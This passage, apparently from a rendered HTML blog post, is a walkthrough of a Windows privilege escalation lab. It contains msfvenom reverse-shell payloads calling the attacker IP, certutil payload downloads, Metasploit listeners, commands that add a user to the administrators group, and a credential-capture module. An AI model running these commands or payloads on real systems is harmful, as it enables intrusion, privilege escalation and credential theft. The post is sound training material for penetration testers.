+        alt="/assets/images/windowsprivescarena/20220425050748.png"
+        title="image" /></p>
+<h2 id="service-escalation---executable-files">Service Escalation - Executable Files</h2>
+<ul>
+<li>finding a service we can overwrite and restart the service will gain us a reverse shell</li>
+<li>we can search for them by a tool like <code>powerup.ps1</code> or manually with <code>accesschk64.exe</code> on the services running , we can list them with powershell:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">Status</span> <span class="o">-eq</span> <span class="s2">&#34;Running&#34;</span><span class="p">}</span></span></span></code></pre></div></div>
+<p>or cmd :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">query</span> <span class="n">type</span><span class="p">=</span><span class="n">service</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425052239.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425052239.png, /assets/images/windowsprivescarena/20220425052239.png 1.5x, /assets/images/windowsprivescarena/20220425052239.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425052239.png"
+        title="image" /></p>
+<ul>
+<li>we see this file has write access by every body , we can simply generate with msfvenom a reverse executable and replace it , then start the service again :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425052507.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425052507.png, /assets/images/windowsprivescarena/20220425052507.png 1.5x, /assets/images/windowsprivescarena/20220425052507.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425052507.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425052537.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425052537.png, /assets/images/windowsprivescarena/20220425052537.png 1.5x, /assets/images/windowsprivescarena/20220425052537.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425052537.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425052548.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425052548.png, /assets/images/windowsprivescarena/20220425052548.png 1.5x, /assets/images/windowsprivescarena/20220425052548.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425052548.png"
+        title="image" /></p>
+<ul>
+<li>we could also use the same exe from the registry escalation section</li>
+</ul>
+<h2 id="service-escalation---binpath">Service Escalation - binPath</h2>
+<ul>
+<li>we are after a service that has RW access for Everyone , we can search for it with :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="p">.\</span><span class="n">accesschk64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-wuvc</span> <span class="n">Everyone</span> <span class="p">*</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426032527.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426032527.png, /assets/images/windowsprivescarena/20220426032527.png 1.5x, /assets/images/windowsprivescarena/20220426032527.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426032527.png"
+        title="image" /></p>
+<ul>
+<li>if we have the : <code>SERVICE_CHANGE_CONFIG</code></li>
+<li>we can now leverage our privilege by writing a new configuration then start the service</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="n">daclsvc</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;net localgroup administrators user /add&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426032937.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426032937.png, /assets/images/windowsprivescarena/20220426032937.png 1.5x, /assets/images/windowsprivescarena/20220426032937.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426032937.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426032947.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426032947.png, /assets/images/windowsprivescarena/20220426032947.png 1.5x, /assets/images/windowsprivescarena/20220426032947.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426032947.png"
+        title="image" /></p>
+<h2 id="potato-escalation---hot-potato">Potato Escalation - Hot Potato</h2>
+<ul>
+<li>the potato attacks are so famous when it comes to windows , actually there are more than one type of potato attack , you can refer to <a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html" target="_blank" rel="noopener noreffer ">this</a> blog.</li>
+<li>the attack vector was fixed in <code>MS16-075</code> , probably windows 7 is vulnerable.</li>
+<li>we can list last updates :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">wmic qfe list full /format:table</span></span></code></pre></div></div>
+<ul>
+<li>searching for the 3 installs , will find none of them patching the vuln</li>
+<li>there are multiple ways to attack hot potato like metasploit , powershell , potato.exe , refer <a href="https://pentestlab.blog/2017/04/13/hot-potato/" target="_blank" rel="noopener noreffer ">here</a></li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">tater</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Tater</span> <span class="n">-Trigger</span> <span class="mf">1</span> <span class="n">-Command</span> <span class="s2">&#34;net localgroup administrators user /add&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425064312.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425064312.png, /assets/images/windowsprivescarena/20220425064312.png 1.5x, /assets/images/windowsprivescarena/20220425064312.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425064312.png"
+        title="image" /></p>
+<ul>
+<li>and we can see the user has been added to the local administrator Group</li>
+</ul>
+<h2 id="registry-escalation---autorun">Registry Escalation - Autorun</h2>
+<ul>
+<li>first you need to run <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank" rel="noopener noreffer ">Autoruns64.exe</a> to list the auto runs applications</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220422205427.png"
+        data-srcset="/assets/images/windowsprivescarena/20220422205427.png, /assets/images/windowsprivescarena/20220422205427.png 1.5x, /assets/images/windowsprivescarena/20220422205427.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220422205427.png"
+        title="image" /></p>
+<ul>
+<li>we can notice the program.exe running under <code>C:\Program Files\Autorun Program\</code> ,now we should use <code>accesschk64.exe</code> to check our privilege on that path</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220422205719.png"
+        data-srcset="/assets/images/windowsprivescarena/20220422205719.png, /assets/images/windowsprivescarena/20220422205719.png 1.5x, /assets/images/windowsprivescarena/20220422205719.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220422205719.png"
+        title="image" /></p>
+<ul>
+<li>it has read/write access For everyone , so we can replace the <code>program.exe</code> with a malicious payload to gain a reverse shell as higher privilege</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="mf">10.9</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">37</span> <span class="n">LPORT</span><span class="p">=</span><span class="mf">9090</span> <span class="o">-f</span> <span class="n">exe</span> <span class="n">-o</span>  <span class="n">program</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
+<ul>
+<li>fire up your http server then from the windows machine download it :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">certutil -urlcache -f http://10.9.0.37:8888/program.exe program.exe</span></span></code></pre></div></div>
+<ul>
+<li>rename it to <code>program.exe</code> as the auto runner program , copy &amp; overwrite it :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220422210828.png"
+        data-srcset="/assets/images/windowsprivescarena/20220422210828.png, /assets/images/windowsprivescarena/20220422210828.png 1.5x, /assets/images/windowsprivescarena/20220422210828.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220422210828.png"
+        title="image" /></p>
+<ul>
+<li>now set you listener :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -x <span class="s2">&#34;use exploit/multi/handler;set LHOST 10.9.0.37;set LPORT 9090;set payload windows/meterpreter/reverse_tcp;run&#34;</span></span></span></code></pre></div></div>
+<ul>
+<li>login with admin account :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">rdesktop</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">174</span><span class="p">.</span><span class="py">128</span>  <span class="n">-u</span> <span class="n">TCM</span> <span class="n">-p</span> <span class="n">Hacker12</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425041654.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425041654.png, /assets/images/windowsprivescarena/20220425041654.png 1.5x, /assets/images/windowsprivescarena/20220425041654.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425041654.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425041715.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425041715.png, /assets/images/windowsprivescarena/20220425041715.png 1.5x, /assets/images/windowsprivescarena/20220425041715.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425041715.png"
+        title="image" /></p>
+<h2 id="registry-escalation---alwaysinstallelevated">Registry Escalation - AlwaysInstallElevated</h2>
+<p>check <code>AlwaysinstalledElevated</code> is on if the value <code>= 0x1</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425042010.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425042010.png, /assets/images/windowsprivescarena/20220425042010.png 1.5x, /assets/images/windowsprivescarena/20220425042010.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425042010.png"
+        title="image" /></p>
+<p>craft msi payload :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="mf">10.9</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">37</span> <span class="n">LPORT</span><span class="p">=</span><span class="mf">7878</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">setup</span><span class="p">.</span><span class="n">msi</span></span></span></code></pre></div></div>
+<p>move it to the machine and run it :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425042353.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425042353.png, /assets/images/windowsprivescarena/20220425042353.png 1.5x, /assets/images/windowsprivescarena/20220425042353.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425042353.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425042406.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425042406.png, /assets/images/windowsprivescarena/20220425042406.png 1.5x, /assets/images/windowsprivescarena/20220425042406.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425042406.png"
+        title="image" /></p>
+<h2 id="privilege-escalation---startup-applications">Privilege Escalation - Startup Applications</h2>
+<ul>
+<li>we can search for this attack vector by running :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">icacls</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425053053.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425053053.png, /assets/images/windowsprivescarena/20220425053053.png 1.5x, /assets/images/windowsprivescarena/20220425053053.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425053053.png"
+        title="image" /></p>
+<p>we can see that Builtin\Users has the <strong>F</strong> flag meaning full control , Built-in user account isÂ <strong>a type of user account that is created during installation</strong></p>
+<ul>
+<li>simply copy a malicious executable to <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\</code></li>
+<li>then when an administrator logs in you will gain a reverse shell</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425053954.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425053954.png, /assets/images/windowsprivescarena/20220425053954.png 1.5x, /assets/images/windowsprivescarena/20220425053954.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425053954.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425054009.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425054009.png, /assets/images/windowsprivescarena/20220425054009.png 1.5x, /assets/images/windowsprivescarena/20220425054009.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425054009.png"
+        title="image" /></p>
+<h2 id="password-mining-escalation---memory">Password Mining Escalation - Memory</h2>
+<ul>
+<li>the discussed attack can be helpful in phishing demonstration , will use metasploit as :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfconsole</span> <span class="n">-x</span> <span class="s2">&#34;use auxiliary/server/capture/http_basic;set uripath x ; run&#34;</span></span></span></code></pre></div></div>
+<ul>
+<li>This module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426025112.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426025112.png, /assets/images/windowsprivescarena/20220426025112.png 1.5x, /assets/images/windowsprivescarena/20220426025112.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426025112.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426025125.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426025125.png, /assets/images/windowsprivescarena/20220426025125.png 1.5x, /assets/images/windowsprivescarena/20220426025125.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426025125.png"
+        title="image" /></p>
+<ul>
+<li>and we have captured his password as we see ;)</li>
+<li>for password mining winpeas are helpful hence it searches for any file its name or content contain words like passwords , key , .. etc</li>
+</ul>
+<h2 id="privilege-escalation---kernel-exploits">Privilege Escalation - Kernel Exploits</h2>
+<ul>
+<li>when it comes to old versions of windows (xp,7,8) it most likely can be exploit using kernel exploitation techniques.</li>
+<li>to detect if it is vulnerable , run <code>systeminfo</code> ,take the output and pass it to <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreffer ">Windows-Exploit-Suggester</a> tool</li>
+<li><strong>NOTE</strong> <code>windows-exploit-suggester</code> can reveal other attack vectors rather than the kernel exploits</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">python</span> <span class="nb">windows-exploit</span><span class="n">-suggester</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-database</span> <span class="mf">2022</span><span class="p">-</span><span class="mf">04</span><span class="p">-</span><span class="mf">25</span><span class="n">-mssb</span><span class="p">.</span><span class="py">xls</span> <span class="p">-</span><span class="n">-systeminfo</span> <span class="p">~/</span><span class="n">CTFs</span><span class="p">/</span><span class="n">Tryhackme</span><span class="p">/</span><span class="n">windowsprivescarena</span><span class="p">/</span><span class="n">kernel_search</span></span></span></code></pre></div></div>
+<ul>
+<li>but the easiest way is to get a meterpreter shell and use the run <code>local_exploit_suggester</code></li>
+<li>note that exploiting not compatible kernel exploit can harm the system , so keep it your last option</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425071551.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425071551.png, /assets/images/windowsprivescarena/20220425071551.png 1.5x, /assets/images/windowsprivescarena/20220425071551.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425071551.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425072907.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425072907.png, /assets/images/windowsprivescarena/20220425072907.png 1.5x, /assets/images/windowsprivescarena/20220425072907.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425072907.png"
+        title="image" /></p>
+<h2 id="automation">Automation</h2>
+<ul>
+<li>there a lot of tools you can use like <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASx64.exe" target="_blank" rel="noopener noreffer ">Winpeas</a> , But Let&rsquo;s Try <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener noreffer ">PowerUp.ps1</a></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426034956.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426034956.png, /assets/images/windowsprivescarena/20220426034956.png 1.5x, /assets/images/windowsprivescarena/20220426034956.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426034956.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426035018.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426035018.png, /assets/images/windowsprivescarena/20220426035018.png 1.5x, /assets/images/windowsprivescarena/20220426035018.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426035018.png"
+        title="image" /></p>
+<h2 id="quick-commands">Quick commands</h2>
+<p><code>Download files from your http server to windows :</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">certutil -urlcache -f <span class="p">&lt;</span>url<span class="p">&gt;</span> &lt;outfile_name&gt;
+</span></span><span class="line"><span class="cl">Invoke-WebRequest -Uri <span class="p">&lt;</span>url<span class="p">&gt;</span> -OutFile <span class="p">&lt;</span>outfile_name&gt;</span></span></code></pre></div></div>
+<ul>
+<li>Remember if you are going to use ftp server , in case moving exe files to use <code>binary on</code></li>
+</ul>
+<p><code>Generate payloads :</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># exe payload to get reverse shell</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.0.37 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -o  common.exe
+</span></span><span class="line"><span class="cl"><span class="c1"># exe payload to execute commands</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;net localgroup administrators user /add&#39;</span> -f exe-service -o common.exe
+</span></span><span class="line"><span class="cl"><span class="c1"># msi payload (for AlwaysInstallElevated)</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.0.37 <span class="nv">LPORT</span><span class="o">=</span><span class="m">7878</span> -f msi -o setup.msi</span></span></code></pre></div></div>
+<ul>
+<li>quick msfconsole listener :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
